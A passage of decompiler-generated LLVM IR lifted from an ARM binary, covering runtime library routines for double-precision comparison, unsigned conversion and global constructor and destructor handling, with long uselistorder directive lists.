  uselistorder i32* @ip, { 19, 20, 21, 8, 22, 23, 24, 25, 26, 27, 28, 16, 17, 3, 18, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 9, 10, 0, 11, 12, 13, 14, 15, 39, 40, 5, 41, 4, 42, 7, 6, 36, 37, 31, 32, 2, 33, 34, 30, 29, 93, 90, 91, 92, 1, 94, 35, 38, 45, 44, 43, 46, 47 }
  uselistorder label %dec_label_pc_17f70, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17f10, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_17f78 = load i32, i32* @r0, align 4
  %v0_17f7c = load i32, i32* @r2, align 4
  store i32 %v0_17f7c, i32* @r0, align 4
  store i32 %v0_17f78, i32* @r2, align 4
  %v0_17f90 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_17f90
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_17f94 = load i32, i32* @r0, align 4
  %v1_17f98 = sext i32 %v3_17f94 to i64
  %v2_17f98 = bitcast i64 %v1_17f98 to double
  %v3_17f98 = load i32, i32* @r2, align 4
  %v4_17f98 = sext i32 %v3_17f98 to i64
  %v5_17f98 = bitcast i64 %v4_17f98 to double
  %v7_17f98 = fcmp oeq double %v2_17f98, %v5_17f98
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_17f98 = fcmp ule double %v2_17f98, %v5_17f98
  %not.v7_17f98 = xor i1 %v7_17f98, true
  %v1_17f9c = and i1 %not.v6_17f98, %not.v7_17f98
  store i1 %v7_17f98, i1* @cpsr_z, align 1
  br i1 %v1_17f9c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_17f98, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_17f94

; uselistorder directives
  uselistorder i1 %v7_17f98, { 1, 2, 0 }
  uselistorder i32* @r2, { 15, 25, 26, 46, 47, 48, 10, 49, 50, 51, 52, 53, 81, 82, 11, 83, 84, 85, 86, 12, 27, 28, 29, 87, 88, 89, 40, 6, 41, 90, 13, 54, 91, 99, 100, 101, 102, 42, 43, 14, 7, 129, 130, 131, 132, 55, 56, 2, 57, 58, 59, 92, 93, 8, 60, 16, 17, 133, 3, 134, 139, 140, 144, 116, 38, 39, 135, 118, 122, 123, 126, 124, 125, 119, 120, 121, 31, 115, 103, 141, 20, 44, 61, 62, 63, 1, 142, 5, 143, 64, 65, 66, 67, 9, 68, 69, 4, 70, 0, 71, 94, 95, 96, 97, 72, 73, 98, 18, 19, 30, 136, 137, 138, 32, 33, 34, 35, 36, 37, 45, 74, 75, 76, 77, 78, 21, 22, 23, 24, 79, 80, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 127, 128 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_17fa8 = load i32, i32* @lr, align 4
  %v0_17fac = call i32 @__aeabi_cdcmple()
  %v0_17fb0 = load i1, i1* @cpsr_z, align 1
  %.v0_17fac. = zext i1 %v0_17fb0 to i32
  call void @__pseudo_branch(i32 %v0_17fa8)
  ret i32 %.v0_17fac.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_17fbc = load i32, i32* @lr, align 4
  %v0_17fc0 = call i32 @__aeabi_cdcmple()
  %v0_17fc4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_17fc4 to i32
  %.v0_17fc0. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_17fbc)
  ret i32 %.v0_17fc0.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_17fd0 = load i32, i32* @lr, align 4
  store i32 %v0_17fd0, i32* %stack_var_-8, align 4
  %v0_17fd4 = call i32 @__aeabi_cdcmple()
  %v0_17fd8 = load i1, i1* @cpsr_z, align 1
  %v1_17fd8 = load i1, i1* @cpsr_c, align 1
  %v2_17fd8 = xor i1 %v1_17fd8, true
  %v3_17fd8 = or i1 %v0_17fd8, %v2_17fd8
  %.v0_17fd4 = select i1 %v3_17fd8, i32 1, i32 %v0_17fd4
  %v2_17fdc = xor i1 %v0_17fd8, true
  %v3_17fdc = and i1 %v1_17fd8, %v2_17fdc
  %..v0_17fd4 = select i1 %v3_17fdc, i32 0, i32 %.v0_17fd4
  %v2_17fe0 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_17fe0)
  ret i32 %..v0_17fd4

; uselistorder directives
  uselistorder i1 %v1_17fd8, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_17fe4 = load i32, i32* @lr, align 4
  store i32 %v0_17fe4, i32* %stack_var_-8, align 4
  %v0_17fe8 = call i32 @__aeabi_cdrcmple()
  %v0_17fec = load i1, i1* @cpsr_z, align 1
  %v1_17fec = load i1, i1* @cpsr_c, align 1
  %v2_17fec = xor i1 %v1_17fec, true
  %v3_17fec = or i1 %v0_17fec, %v2_17fec
  %.v0_17fe8 = select i1 %v3_17fec, i32 1, i32 %v0_17fe8
  %v2_17ff0 = xor i1 %v0_17fec, true
  %v3_17ff0 = and i1 %v1_17fec, %v2_17ff0
  %..v0_17fe8 = select i1 %v3_17ff0, i32 0, i32 %.v0_17fe8
  %v2_17ff4 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_17ff4)
  ret i32 %..v0_17fe8

; uselistorder directives
  uselistorder i1 %v1_17fec, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 69, 1, 6, 7, 8, 9, 59, 60, 65, 61, 62, 63, 66, 10, 11, 12, 56, 64, 13, 14, 16, 15, 17, 70, 67, 20, 21, 22, 23, 18, 19, 68, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 37, 38, 41, 42, 55, 71, 43, 44, 45, 57, 46, 47, 48, 49, 58, 50, 51, 52, 53, 54 }
  uselistorder i1* @cpsr_z, { 9, 10, 11, 12, 13, 20, 21, 22, 23, 24, 25, 14, 15, 16, 17, 2, 18, 19, 27, 28, 29, 30, 31, 32, 33, 0, 34, 1, 3, 4, 26, 5, 6, 7, 8, 35 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_17ff8 = load i32, i32* @lr, align 4
  %v0_17ffc = call i32 @__aeabi_cdrcmple()
  %v0_18000 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_18000 to i32
  %.v0_17ffc. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_17ff8)
  ret i32 %.v0_17ffc.

; uselistorder directives
  uselistorder i1 false, { 44, 13, 14, 85, 86, 87, 88, 89, 90, 91, 92, 93, 0, 10, 45, 36, 46, 47, 48, 49, 50, 4, 94, 6, 51, 16, 52, 53, 54, 15, 55, 56, 58, 59, 60, 61, 62, 63, 64, 57, 17, 65, 28, 18, 29, 66, 67, 68, 20, 19, 11, 12, 69, 70, 71, 2, 3, 72, 30, 31, 73, 32, 33, 21, 39, 40, 7, 22, 74, 34, 35, 75, 76, 37, 38, 77, 78, 41, 42, 79, 80, 81, 82, 83, 84, 43, 95, 1, 25, 24, 26, 23, 8, 9, 27, 5, 96, 97, 98, 99 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 8, 26, 27, 28, 29, 56, 58, 59, 60, 63, 64, 65, 3, 67, 68, 69, 70, 71, 23, 24, 25, 30, 31, 32, 33, 72, 79, 80, 81, 82, 83, 84, 85, 93, 35, 34, 0, 36, 37, 1, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 4, 112, 113, 114, 5, 115, 116, 117, 6, 118, 119, 120, 121, 122, 123, 124, 125, 75, 38, 39, 40, 7, 42, 43, 41, 94, 95, 96, 126, 57, 89, 127, 128, 129, 18, 19, 20, 21, 97, 98, 99, 130, 61, 62, 91, 92, 44, 45, 86, 87, 88, 66, 73, 22, 76, 77, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 2, 74, 16, 17, 78, 90, 100, 101, 9, 10 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1800c = icmp slt i32 %arg1, 0
  %v2_1800c = mul i32 %arg1, 2
  br i1 %v1_1800c, label %dec_label_pc_18040, label %dec_label_pc_18014

dec_label_pc_18014:                               ; preds = %entry
  %v1_18014 = add i32 %v2_1800c, 2097152
  %v2_18014 = icmp ugt i32 %v2_1800c, -2097153
  br i1 %v2_18014, label %dec_label_pc_18048, label %dec_label_pc_1801c

dec_label_pc_1801c:                               ; preds = %dec_label_pc_18014
  %v6_18014 = icmp slt i32 %v1_18014, 0
  br i1 %v6_18014, label %dec_label_pc_18020, label %dec_label_pc_18040

dec_label_pc_18020:                               ; preds = %dec_label_pc_1801c
  %v4_18024 = sdiv i32 %v1_18014, 2097152
  %v5_18024 = sub nsw i32 -993, %v4_18024
  %v11_18024 = icmp slt i32 %v5_18024, 0
  br i1 %v11_18024, label %dec_label_pc_18050, label %dec_label_pc_1802c

dec_label_pc_1802c:                               ; preds = %dec_label_pc_18020
  %v3_1802c = mul i32 %arg1, 2048
  %v4_18034 = udiv i32 %arg2, 2097152
  %v1_18030 = or i32 %v3_1802c, %v4_18034
  %v5_18034 = or i32 %v1_18030, -2147483648
  %v6_18038 = lshr i32 %v5_18034, %v5_18024
  ret i32 %v6_18038

dec_label_pc_18040:                               ; preds = %dec_label_pc_1801c, %entry
  ret i32 0

dec_label_pc_18048:                               ; preds = %dec_label_pc_18014
  %v4_18048 = mul i32 %arg1, 4096
  %v5_18048 = or i32 %v4_18048, %arg2
  %v7_18048 = icmp eq i32 %v5_18048, 0
  br i1 %v7_18048, label %dec_label_pc_18050, label %dec_label_pc_18058

dec_label_pc_18050:                               ; preds = %dec_label_pc_18048, %dec_label_pc_18020
  ret i32 -1

dec_label_pc_18058:                               ; preds = %dec_label_pc_18048
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 21, 5, 6, 22, 7, 8, 9, 10, 23, 13, 14, 27, 17, 28, 15, 12, 24, 16, 18, 19, 25, 26, 11, 20 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 171, 36, 37, 38, 156, 39, 40, 41, 42, 43, 82, 44, 186, 105, 106, 188, 147, 148, 187, 107, 189, 190, 191, 192, 193, 81, 122, 162, 45, 164, 163, 194, 195, 196, 46, 83, 84, 85, 86, 87, 88, 172, 173, 149, 150, 151, 47, 152, 89, 213, 214, 111, 215, 216, 92, 217, 91, 218, 90, 199, 174, 80, 175, 176, 48, 49, 177, 178, 123, 124, 166, 125, 167, 126, 168, 50, 93, 51, 153, 108, 165, 79, 52, 219, 109, 201, 53, 127, 202, 203, 54, 128, 204, 205, 119, 157, 0, 55, 56, 57, 129, 94, 96, 95, 97, 98, 99, 100, 113, 101, 114, 102, 103, 197, 198, 179, 180, 120, 58, 59, 60, 154, 61, 121, 181, 115, 112, 62, 182, 183, 184, 200, 63, 155, 1, 64, 65, 66, 67, 68, 69, 70, 71, 72, 158, 73, 74, 75, 76, 77, 130, 110, 131, 116, 169, 170, 132, 117, 133, 137, 159, 136, 160, 135, 134, 161, 146, 138, 185, 139, 140, 206, 207, 208, 141, 209, 142, 143, 144, 212, 118, 210, 78, 211, 104, 145 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18064 = load i32, i32* @global_var_23000.523, align 4
  %v7_18068 = icmp eq i32 %v3_18064, -1
  %v3_1806c = load i32, i32* @r4, align 4
  store i32 %v3_1806c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23000.523 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_18068, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1806c, i32* %r4.global-to-local, align 4
  %v9_18074 = load i32, i32* @r0, align 4
  ret i32 %v9_18074

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1807c = phi i32 [ %v3_18080, %.preheader ], [ %v3_18064, %entry ]
  call void @__pseudo_branch(i32 %v0_1807c)
  %v0_18080 = load i32, i32* %r4.global-to-local, align 4
  %v1_18080 = add i32 %v0_18080, -4
  %v2_18080 = inttoptr i32 %v1_18080 to i32*
  %v3_18080 = load i32, i32* %v2_18080, align 4
  store i32 %v1_18080, i32* %r4.global-to-local, align 4
  %v3_18084 = icmp eq i32 %v3_18080, -1
  br i1 %v3_18084, label %dec_label_pc_1808c, label %.preheader

dec_label_pc_1808c:                               ; preds = %.preheader
  %v2_1808c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1808c, i32* %r4.global-to-local, align 4
  %v8_1808c = load i32, i32* @r0, align 4
  ret i32 %v8_1808c

; uselistorder directives
  uselistorder i32 %v3_18080, { 1, 0 }
  uselistorder i32 %v3_18064, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 17, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 16, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, {}
  uselistorder i32* @global_var_23000.523, { 1, 0 }
  uselistorder i32 1, { 562, 245, 461, 480, 563, 481, 564, 462, 940, 941, 942, 565, 199, 203, 202, 200, 201, 198, 205, 204, 943, 172, 944, 567, 566, 174, 175, 179, 176, 173, 177, 178, 180, 307, 306, 308, 431, 945, 946, 25, 26, 947, 387, 386, 388, 568, 170, 171, 167, 166, 169, 168, 1013, 389, 1014, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 569, 315, 313, 314, 310, 309, 311, 312, 1027, 490, 1028, 1029, 570, 17, 16, 18, 15, 21, 19, 20, 1030, 230, 1031, 432, 1032, 1037, 1038, 467, 1039, 1040, 1041, 491, 492, 1042, 1043, 571, 316, 321, 317, 320, 319, 318, 572, 1044, 573, 138, 137, 136, 139, 1045, 574, 294, 295, 1046, 1047, 1048, 1049, 575, 154, 155, 876, 877, 878, 879, 880, 881, 882, 883, 884, 578, 577, 576, 287, 288, 289, 885, 886, 887, 888, 889, 582, 581, 580, 579, 209, 208, 214, 210, 213, 212, 211, 215, 216, 207, 217, 433, 1050, 1051, 434, 1052, 1053, 1054, 1055, 1056, 493, 1057, 1058, 1059, 1060, 1062, 584, 583, 31, 29, 33, 30, 34, 35, 36, 28, 32, 406, 1067, 1063, 1064, 1065, 1066, 453, 585, 22, 23, 24, 1068, 586, 919, 920, 921, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 587, 192, 193, 186, 187, 188, 189, 191, 190, 414, 91, 1084, 1085, 1086, 1087, 1088, 1089, 588, 323, 324, 325, 322, 589, 237, 415, 494, 948, 590, 184, 182, 181, 185, 183, 1090, 1091, 495, 591, 95, 96, 93, 97, 92, 94, 949, 950, 593, 592, 327, 329, 328, 326, 330, 594, 27, 1098, 435, 1097, 416, 394, 1100, 436, 1099, 0, 1103, 1104, 1105, 1106, 597, 596, 595, 290, 291, 1146, 1147, 1148, 1149, 1150, 468, 1151, 1152, 469, 1154, 496, 1155, 463, 464, 472, 1, 470, 471, 1156, 1153, 497, 1157, 457, 604, 603, 548, 602, 601, 549, 600, 599, 598, 407, 456, 1221, 1222, 1223, 1224, 1225, 437, 605, 57, 922, 923, 924, 606, 333, 334, 332, 331, 951, 417, 952, 1264, 418, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 550, 608, 607, 127, 128, 129, 130, 125, 124, 123, 126, 132, 131, 498, 1107, 1108, 1123, 1124, 1125, 1126, 609, 551, 134, 133, 135, 421, 438, 953, 499, 954, 955, 500, 403, 439, 400, 419, 420, 956, 501, 957, 958, 959, 960, 440, 961, 390, 962, 963, 502, 964, 965, 560, 561, 623, 622, 621, 620, 619, 618, 617, 616, 615, 614, 613, 612, 611, 552, 610, 275, 265, 266, 279, 273, 267, 268, 274, 269, 272, 270, 264, 271, 278, 276, 277, 1208, 1209, 553, 624, 224, 222, 227, 229, 225, 226, 223, 228, 966, 967, 968, 969, 401, 970, 971, 972, 625, 148, 149, 146, 150, 147, 973, 974, 626, 165, 1109, 1110, 1111, 1112, 1113, 88, 87, 85, 86, 84, 83, 89, 90, 975, 628, 627, 45, 46, 48, 47, 441, 473, 631, 630, 629, 632, 335, 633, 292, 293, 634, 122, 635, 336, 636, 221, 637, 337, 638, 338, 639, 339, 640, 206, 641, 2, 645, 644, 643, 642, 65, 66, 503, 646, 442, 504, 647, 164, 648, 649, 893, 654, 653, 652, 651, 650, 232, 233, 236, 235, 234, 1237, 1238, 657, 656, 655, 238, 658, 408, 913, 914, 402, 915, 659, 368, 372, 367, 369, 371, 373, 370, 916, 409, 890, 660, 73, 75, 76, 74, 77, 284, 283, 1015, 393, 443, 1016, 662, 661, 78, 79, 82, 80, 81, 663, 12, 8, 14, 10, 9, 11, 13, 664, 68, 70, 69, 71, 72, 67, 665, 666, 667, 669, 668, 1277, 444, 672, 671, 670, 341, 340, 673, 195, 196, 194, 197, 58, 59, 60, 61, 674, 41, 42, 40, 39, 675, 676, 343, 342, 445, 1241, 677, 298, 299, 505, 506, 404, 681, 680, 679, 678, 251, 250, 422, 682, 344, 683, 43, 684, 300, 685, 285, 686, 282, 687, 345, 688, 280, 689, 281, 507, 1158, 405, 1159, 1160, 508, 1179, 693, 692, 691, 690, 158, 160, 161, 159, 694, 695, 1210, 1211, 697, 696, 347, 348, 346, 1278, 698, 1199, 1200, 1201, 1202, 3, 1033, 1034, 1035, 1036, 976, 977, 699, 349, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 423, 978, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 259, 257, 258, 260, 261, 910, 395, 100, 101, 102, 424, 1061, 1102, 1101, 864, 865, 866, 867, 868, 869, 870, 1282, 53, 54, 51, 52, 979, 50, 49, 509, 700, 1130, 1127, 1128, 1129, 396, 425, 141, 143, 140, 142, 144, 1114, 1118, 1119, 1120, 1121, 1122, 701, 116, 114, 118, 115, 119, 117, 446, 1115, 1116, 510, 1117, 703, 702, 218, 219, 220, 705, 704, 252, 707, 706, 254, 255, 894, 709, 708, 121, 120, 458, 980, 512, 981, 982, 447, 448, 983, 984, 513, 985, 987, 988, 989, 514, 991, 449, 992, 990, 511, 993, 515, 994, 459, 995, 996, 986, 713, 712, 711, 710, 103, 108, 105, 109, 113, 104, 110, 111, 106, 112, 107, 997, 714, 350, 355, 351, 353, 354, 352, 715, 263, 262, 998, 999, 1000, 716, 63, 64, 460, 410, 1002, 411, 1003, 450, 1004, 1005, 1007, 397, 1008, 516, 1009, 412, 1006, 451, 724, 723, 722, 721, 720, 719, 718, 717, 240, 243, 244, 242, 241, 517, 426, 725, 151, 152, 153, 1001, 474, 554, 726, 356, 518, 891, 892, 727, 358, 357, 359, 1279, 475, 1280, 1281, 728, 361, 360, 163, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 427, 1145, 731, 730, 729, 364, 363, 362, 366, 365, 733, 732, 734, 1092, 1093, 1094, 1095, 1096, 737, 736, 735, 156, 157, 1226, 738, 62, 739, 44, 740, 37, 38, 741, 380, 742, 253, 743, 256, 744, 381, 745, 239, 145, 746, 374, 296, 747, 249, 748, 375, 749, 750, 751, 376, 752, 377, 753, 246, 754, 378, 379, 286, 476, 1182, 1183, 477, 1242, 1243, 391, 1244, 895, 398, 413, 896, 897, 898, 392, 521, 899, 900, 901, 902, 903, 904, 905, 906, 519, 520, 465, 522, 907, 761, 760, 759, 758, 757, 756, 755, 908, 909, 768, 767, 766, 765, 764, 555, 763, 762, 911, 912, 770, 769, 917, 918, 523, 524, 771, 925, 926, 927, 928, 929, 930, 525, 776, 775, 774, 773, 772, 305, 304, 931, 932, 933, 934, 935, 526, 936, 937, 938, 939, 783, 782, 781, 780, 779, 778, 777, 248, 247, 1010, 1011, 786, 785, 784, 1012, 792, 791, 790, 789, 788, 787, 1017, 871, 872, 528, 873, 527, 874, 875, 863, 1018, 1019, 801, 800, 799, 798, 797, 796, 795, 794, 793, 303, 302, 301, 529, 530, 805, 804, 803, 802, 482, 1180, 806, 98, 99, 808, 807, 4, 531, 1181, 454, 810, 809, 478, 1191, 532, 533, 1193, 1192, 534, 813, 812, 811, 483, 1194, 1195, 535, 536, 537, 1203, 556, 1196, 538, 814, 479, 539, 1197, 540, 1198, 820, 819, 818, 817, 816, 815, 484, 1204, 1205, 485, 821, 822, 1206, 541, 1207, 825, 824, 823, 827, 826, 452, 1212, 1213, 1214, 542, 399, 1215, 1216, 1217, 543, 1218, 830, 829, 828, 557, 1219, 831, 297, 1220, 558, 162, 487, 1227, 1228, 486, 1229, 1230, 488, 489, 1231, 1232, 832, 1233, 5, 6, 1236, 1234, 1235, 544, 836, 835, 834, 833, 1239, 1240, 838, 837, 842, 841, 840, 839, 845, 844, 843, 847, 846, 1245, 1246, 545, 1256, 1257, 455, 1258, 850, 849, 848, 466, 7, 854, 853, 852, 851, 429, 1247, 1248, 1249, 428, 1250, 1254, 1255, 546, 856, 855, 547, 1251, 1252, 1253, 858, 857, 56, 1259, 1260, 859, 559, 55, 430, 1261, 1262, 860, 382, 1263, 231, 861, 862, 385, 384, 383 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_18098 = load i32, i32* @r0, align 4
  ret i32 %v5_18098

; uselistorder directives
  uselistorder i32* @r0, { 9, 10, 11, 61, 62, 63, 144, 12, 64, 13, 145, 8, 146, 147, 14, 177, 15, 184, 185, 186, 187, 190, 188, 189, 16, 65, 66, 191, 192, 7, 193, 194, 148, 149, 150, 195, 196, 203, 217, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 138, 139, 140, 141, 18, 19, 215, 21, 151, 152, 22, 153, 154, 155, 23, 280, 281, 282, 51, 273, 283, 284, 57, 58, 59, 60, 24, 34, 35, 36, 75, 76, 37, 54, 285, 286, 94, 25, 178, 179, 180, 181, 182, 183, 67, 68, 69, 70, 71, 261, 262, 288, 26, 27, 275, 28, 274, 77, 55, 78, 29, 276, 287, 79, 30, 250, 251, 252, 253, 254, 255, 256, 257, 17, 266, 40, 156, 157, 158, 20, 209, 210, 211, 212, 213, 214, 31, 204, 205, 206, 207, 80, 216, 81, 159, 160, 161, 3, 32, 162, 163, 4, 6, 0, 1, 164, 165, 5, 166, 167, 168, 33, 169, 170, 171, 2, 172, 208, 72, 73, 74, 290, 291, 218, 219, 220, 221, 222, 223, 224, 225, 173, 174, 197, 198, 199, 200, 201, 202, 38, 39, 82, 289, 41, 52, 53, 42, 263, 43, 278, 44, 279, 46, 45, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 142, 143, 175, 176, 258, 259, 260, 264, 265, 267, 268, 269, 270, 271, 272, 277, 47, 48, 49, 50, 56 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_180a0 = load i32, i32* @r4, align 4
  %v0_180a8 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_180a0)
  ret i32 %v0_180a8

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 18, 3, 4, 5, 6, 7, 12, 10, 11, 23, 24, 20, 21, 22, 0, 25, 13, 8, 14, 9, 15, 16, 17, 2, 19 }
  uselistorder i32 0, { 0, 1067, 1, 1068, 1069, 831, 373, 374, 1070, 1071, 1072, 1073, 2, 1074, 1075, 1076, 4, 5, 6, 1077, 1078, 3, 1079, 1080, 7, 1081, 1082, 47, 832, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 111, 110, 199, 200, 201, 1091, 1092, 1093, 1094, 1095, 1096, 48, 1097, 1098, 1099, 49, 50, 193, 1100, 1101, 1102, 1103, 51, 194, 386, 1104, 1105, 1106, 1107, 1108, 1109, 52, 1110, 9, 8, 53, 833, 1111, 835, 834, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 10, 892, 893, 894, 895, 896, 897, 387, 1125, 836, 11, 1126, 388, 898, 12, 899, 1127, 1128, 837, 13, 1129, 1130, 389, 15, 14, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 838, 839, 1138, 841, 1139, 1140, 842, 843, 1141, 1142, 840, 1143, 844, 1144, 845, 1145, 1146, 1147, 1148, 54, 16, 1368, 1369, 1370, 1371, 137, 1372, 202, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 203, 846, 849, 847, 848, 1380, 1381, 1382, 1383, 1384, 1385, 1396, 70, 116, 1397, 1398, 1399, 1400, 1401, 1402, 1411, 1412, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1413, 850, 1149, 1150, 1425, 390, 391, 1416, 1417, 204, 1418, 1419, 1421, 1420, 1422, 1423, 322, 1424, 195, 196, 197, 1426, 1414, 1415, 102, 103, 1427, 1429, 1430, 1428, 1431, 1432, 1433, 1434, 129, 1435, 1436, 130, 1437, 131, 1438, 132, 1439, 207, 900, 205, 901, 902, 903, 206, 904, 117, 118, 905, 208, 906, 392, 55, 393, 907, 908, 323, 209, 394, 395, 909, 210, 1440, 1441, 1442, 1447, 211, 1443, 276, 396, 1448, 397, 71, 72, 73, 74, 152, 153, 212, 213, 1449, 154, 1450, 330, 329, 328, 17, 125, 75, 1020, 1021, 1451, 1452, 1022, 326, 1151, 214, 1453, 1454, 1455, 1456, 1457, 1152, 1153, 56, 1154, 1155, 155, 1156, 1157, 1458, 1459, 1460, 18, 1461, 1462, 1158, 215, 1159, 1160, 1161, 1162, 1163, 1164, 1463, 216, 331, 1464, 1471, 1472, 398, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 76, 1482, 1481, 119, 1505, 1506, 399, 1540, 1526, 1527, 1528, 20, 19, 335, 320, 321, 327, 1529, 1530, 1532, 1533, 156, 271, 1535, 400, 1536, 1537, 21, 1538, 1539, 1541, 401, 336, 1534, 1531, 1542, 1543, 217, 1544, 1545, 22, 1611, 1612, 1613, 1614, 219, 218, 1615, 220, 1023, 1024, 23, 851, 1165, 77, 157, 1166, 1167, 277, 24, 852, 279, 1168, 78, 158, 1169, 1170, 278, 1692, 1693, 1694, 1695, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1696, 1697, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 57, 1714, 1715, 1716, 1717, 58, 1718, 1719, 59, 1720, 1721, 60, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1736, 1737, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 61, 1754, 1755, 1756, 1757, 62, 1758, 1759, 1760, 1761, 63, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1483, 1484, 1498, 402, 403, 1499, 1500, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 221, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 64, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 159, 128, 1209, 1210, 222, 223, 1211, 1212, 1213, 1214, 224, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 65, 1224, 